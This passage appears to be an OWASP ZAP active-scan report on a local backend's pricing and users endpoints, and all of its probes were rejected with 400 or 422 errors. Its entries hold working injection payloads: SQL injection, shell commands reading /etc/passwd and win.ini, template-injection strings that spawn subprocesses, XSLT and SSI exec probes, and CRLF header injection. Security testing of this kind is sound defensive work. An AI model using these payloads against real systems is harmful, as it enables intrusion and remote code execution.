  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe' UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'&cat /etc/passwd&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'&type %SYSTEMROOT%\\win.ini&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe') UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe';cat /etc/passwd;'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe';get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe) UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe;")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe;cat /etc/passwd;")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe;get-help #")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe;get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\" UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\"&cat /etc/passwd&\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\"&type %SYSTEMROOT%\\win.ini&\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\";cat /etc/passwd;\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\";get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\"|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("Set-cookie: Tamper=5d08dabf-dfc4-4ddf-9dea-836a7a55e413")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("URL='http://1893954760473071002.owasp.org'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"+response.write(268,102*94,622)+\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"/><xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"><!--#EXEC cmd=\"dir \\\"--><")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"><!--#EXEC cmd=\"ls /\"--><")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("]]>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any?\nSet-cookie: Tamper=5d08dabf-dfc4-4ddf-9dea-836a7a55e413")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any?\r\nSet-cookie: Tamper=5d08dabf-dfc4-4ddf-9dea-836a7a55e413")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any?\r\nSet-cookie: Tamper=5d08dabf-dfc4-4ddf-9dea-836a7a55e413\r\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any\nSet-cookie: Tamper=5d08dabf-dfc4-4ddf-9dea-836a7a55e413")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any\r\nSet-cookie: Tamper=5d08dabf-dfc4-4ddf-9dea-836a7a55e413")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any\r\nSet-cookie: Tamper=5d08dabf-dfc4-4ddf-9dea-836a7a55e413\r\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("cat /etc/passwd")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("cwpgBdUPHTDhvFeePDOuJuELHZlqOpKyTJkaCWgVuucHWUcbBSGgykdSVUryHiKBlGQnuGQaPMjSCyhLdtsnPDZJTuCBBjKVnMBdjQfjBcZmmhMENaYNtpRWxMdtXQksVcVBbOCrtfPCtkdfnNKnZlNQmQUGZNqksusegCuiCDxXPUAiIYDOFwkLyBCWgDPvgfeqpFVghyfZLguDojfYDhcqtHwJfYZwhPZeSOwdSrWdwWrCneCNBkwsdqDCQmUOyolxDhEryhpmccvnaENOcLFJKNKFZyPgJpoaiNBkRRkasVfwyMUHPEtBmCTNJwcyqHqONPuNXcrNiGuyJMCNXGDwUXjLVkRXfLvXfkWeAojsCflHyPJQONXhcwIccourEOfeUUSjgPIiBeilindmZvuEoZeUOuHCcbxlbpCHfsuirVevyjZBwuMFEsHCwtvdyiGVKiXfwEcovoiCVMtZcZDDxLqUvwBnqbfPdYoOibjHrWtBgKohmXvIuAZWFmJ)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://\\1893954760473071002.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com:80/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com:80/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("https://1893954760473071002%2eowasp%2eorg")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("https://1893954760473071002.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("https://1893954760473071002.owasp.org/?John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("https://\\1893954760473071002.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("response.write(268,102*94,622)")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("system-property('xsl:vendor')/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com:80/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com:80/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj 1654*3161 zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj#set($x=7408*2055)${x}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj#{7358*2490}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj${6876*4249}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj<%=2420*2076%>zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj<p th:text=\"${4295*6978}\"></p>zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{#9173*1353}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{6554*6907}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{@4639*9011}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{@math key=\"7644\" method=\"multiply\" operand=\"9717\"/}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{{67840|add:68380}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{{6949*1301}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{{=6139*9596}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{{print \"1693\" \"6578\"}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{system(\"sleep 15\")}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"sleep 15\")}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{{__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\")\")()}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate/
  * Node Name: `http://backend:8000/pricing/calculate/ ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/users/
  * Node Name: `http://backend:8000/users/ ()({username,password,role})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/users/
  * Node Name: `http://backend:8000/users/ ()({username,password,role})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("#set($engine=\"\")\n#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"sleep 15\"))\n#set($null=$proc.waitFor())\n${null}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("#{%x(sleep 15)}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("${__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("'(")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("+response.write({0}*{1})+")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("1893954760473071002.owasp.org")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("5;URL='https://1893954760473071002.owasp.org'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("5;URL='https://1893954760473071002.owasp.org/?John Doe'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()(";")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()(";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<!--")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<!--#EXEC cmd=\"dir \\\"-->")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<!--#EXEC cmd=\"ls /\"-->")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 15\") }")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<%=%x(sleep 15)%>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:value-of select=\"document('http://backend:22')\"/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:value-of select=\"php:function('exec','erroneous_command 2>&amp;1')\"/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("<xsl:variable name=\"rtobject\" select=\"runtime:getRuntime()\"/>\n<xsl:variable name=\"process\" select=\"runtime:exec($rtobject,'erroneous_command')\"/>\n<xsl:variable name=\"waiting\" select=\"process:waitFor($process)\"/>\n<xsl:value-of select=\"$process\"/>")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe AND 1=1 -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe AND 1=2 -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe OR 1=1 -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe UNION ALL select NULL -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe&cat /etc/passwd&")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe&type %SYSTEMROOT%\\win.ini")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("John Doe' AND '1'='1' -- ")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
